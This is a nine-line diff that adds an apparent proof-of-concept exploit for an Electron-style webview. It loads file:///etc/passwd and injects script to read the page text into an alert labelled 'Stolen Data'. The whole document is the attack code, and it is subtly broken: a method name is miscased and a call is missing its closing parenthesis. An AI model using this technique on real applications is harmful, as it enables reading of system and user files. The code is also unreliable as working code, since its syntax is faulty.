@@ -1,0 +1,9 @@
+<webview src="file:///etc/passwd"></webview>
+
+webview = document.querySelector("webview");
+webview.addEventListener('dom-ready', () => {
+    setTimeout(function(){
+        webview.executeJavascript("alert('Stolen Data:\n\n' + document.body.innerText")
+    }
+    ,1000);
+})
